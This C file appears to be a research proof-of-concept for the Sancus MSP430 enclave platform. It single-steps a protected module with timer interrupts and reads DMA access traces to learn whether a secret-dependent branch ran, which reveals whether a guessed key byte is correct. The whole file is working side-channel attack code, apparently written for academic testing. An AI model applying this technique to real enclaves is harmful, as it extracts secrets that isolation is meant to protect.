#include <stdint.h>
#include <msp430.h>
#include <sancus/sm_support.h>
#include <sancus_support/dma_attacker.h>
#include <sancus_support/sm_io.h>
#include <sancus_support/sancus_step.h>

/* NOTE: in this proof-of-concept, we use an explicit unprotected memory access
 * as a "marker" to be able to easily recognize the jump instruction of
 * interest, even when the compiler-generated entry/exit SM code would change.
 * In a real attack, one would have to manually analyze the assembly code and
 * use an absolute offset. */
#define REL_INSTRUCTION_NUMBER_JMP 7
#define TRACE_MASK 0x8
int instruction_counter = 0;
uint16_t delay = 0;
uint16_t dma_trace[2] = {0};
uint16_t dma_trace_idx = 0;

int marker = 0;

DECLARE_SM(foo, 0x1234);

void SM_ENTRY(foo) test(char key) {
    char * p = &key;
    __asm__ __volatile__(
        "mov #1, %1\n\t"
        "mov %0, r6\n\t"
        "mov #0x42, r7\n\t"
        "cmp.b @r6+, r7\n\t"
        "jz 1f\n\t"
        "bis #0x1, r7\n\t"
        "jmp 2f\n\t"
        "1: nop\n\t"
        "nop\n\t"
        "nop\n\t"
        "2: nop\n\t"
        :
        :"m"(p), "m"(marker)
        :"r6", "r7"
    );
}

void SM_ENTRY(foo) foo_exit(void)
{
    /* NOTE: only SM 1 can exit on Aion */
    FINISH();
}

/*
 * For the JMP 2f instruction, the program memory trace will be 00000000 00001111
 * For the NOP    instruction, the program memory trace will be 00000000 00000111
 * The JMP is instruction is executed if the guess was incorrect, the NOP if it
 * was correct.
 *
 * Using TRACE_MASK to get the bit that differs in the two possible traces, we
 * can tell whether a collected trace was generated as a result of a correct or
 * an incorrect guess.
 */

void irqHandler(void)
{
    if (marker)
    {
    	if (++instruction_counter == REL_INSTRUCTION_NUMBER_JMP)
    	{
    	    dma_trace[dma_trace_idx++] = DMA_TRACE;
    	}
    }

    __ss_set_dma_attacker_delay(0);
    uint16_t *pmem_addr = (uint16_t*) irqHandler;
    DMA_ADDR = pmem_addr;
}

int main()
{
    msp430_io_init();
    asm("eint\n\t");
    sancus_enable(&foo);

    __ss_start();
    test(0x41);
    pr_info1("DMA_TRACE for wrong guess   = %#x\n", dma_trace[0]);

    marker = 0;
    instruction_counter = 0;
    __ss_start();
    test(0x42);
    pr_info1("DMA_TRACE for correct guess = %#x\n", dma_trace[1]);

    ASSERT(dma_trace_idx == 2);
    ASSERT( (dma_trace[0] & TRACE_MASK));
    ASSERT(!(dma_trace[1] & TRACE_MASK));

    foo_exit();
    ASSERT(0 && "should never reach here");
}

/* ======== TIMER A ISR ======== */
SANCUS_STEP_ISR_ENTRY2(irqHandler, __ss_end)
